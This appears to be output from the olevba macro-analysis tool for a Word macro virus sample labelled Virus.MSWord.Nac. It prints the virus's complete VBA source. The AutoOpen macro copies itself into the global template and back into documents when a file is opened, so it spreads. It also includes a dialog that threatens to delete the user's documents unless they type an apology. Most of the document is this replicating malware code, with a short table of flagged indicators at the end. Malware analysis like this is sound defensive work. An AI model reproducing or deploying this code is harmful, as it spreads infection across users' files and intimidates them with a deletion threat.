olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nac-3b0fe21f0fb22f1431caebd4dccacdbb9572954d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nac-3b0fe21f0fb22f1431caebd4dccacdbb9572954d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Nac-3b0fe21f0fb22f1431caebd4dccacdbb9572954d - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim thishour
Dim thishuor
Dim dlg As Object
Dim nor
Dim kk
Dim t
Dim file$
Dim filem$
Dim nor1
Dim kkk
Dim tt
thishour = WordBasic.Hour(WordBasic.Now())
If thishuor = 20 Then
    WordBasic.BeginDialog 320, 144, "Ð¡ÐÄ"
        WordBasic.Text 10, 10, 101, 13, "Á¢¼´ÕýÈ·ÊäÈë:", "Text4"
        WordBasic.Text 61, 28, 101, 13, "ÎÒÓÐ×ï!ÎÒ´íÁË!ÈÄÁËÎÒ°É!", "Text2"
        WordBasic.Text 21, 48, 171, 13, "·ñÔò,ÄãµÄÎÄµµ½«±»É¾³ý!", "Text3"
        WordBasic.TextBox 54, 90, 239, 18, "WMH"
        WordBasic.OKButton 95, 112, 88, 21
    WordBasic.EndDialog
    Set dlg = WordBasic.CurValues.UserDialog
    WordBasic.Dialog.UserDialog dlg
    
    If dlg.wmh <> "ÎÒÓÐ×ï!ÎÒ´íÁË!ÈÄÁËÎÒ°É!" And dlg.wmh <> "wmh" Then
        WordBasic.MsgBox "ÊäÈë´íÎó,ÔÙ¸øÄãÒ»´Î»ú»á¡£ÔÙ³ö´í£ººÙºÙ....", "Ð¡ÐÄ!", 48
        WordBasic.Dialog.UserDialog dlg
    Else
        WordBasic.MsgBox "ºÃÁË,ÈÄÁËÄã,¼ÌÐø....", "·Å¹ý!", 48
        GoTo eeend
    End If
    If dlg.wmh = "ÎÒÓÐ×ï!ÎÒ´íÁË!ÈÄÁËÎÒ°É!" Or dlg.wmh = "wmh" Then
        WordBasic.MsgBox "ºÃÁË,ÈÄÁËÄã,¼ÌÐø....", "·Å¹ý!", 48
    Else
        WordBasic.MsgBox "ÏÅÄãµÄ....¹þ¹þ¹þ", "ÓÐ×ï!", 48
    End If
eeend:
End If
'   file$ = FileName$()
'   filem$ = file$ + ":AutoOpen"
'   MacroCopy filem$, "AutoOpen"

nor = WordBasic.CountMacros(0)
If nor > 0 Then
    For kk = 1 To nor
        If WordBasic.[MacroName$](kk, 0) = "AutoOpen" Then
        t = 1
        End If
        Next kk
        
End If

file$ = WordBasic.[FileName$]()
filem$ = file$ + ":AutoOpen"
If t <> 1 Then
    WordBasic.MacroCopy filem$, "AutoOpen"
End If

nor1 = WordBasic.CountMacros(1)
If nor1 > 0 Then
    For kkk = 1 To nor1
        If WordBasic.[MacroName$](kkk, 1) = "AutoOpen" Then
        tt = 1
        End If
        Next kkk
        
End If

If tt <> 1 Then
    WordBasic.FileSaveAs Format:=1
    On Error Resume Next
    WordBasic.MacroCopy "AutoOpen", filem$
End If

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

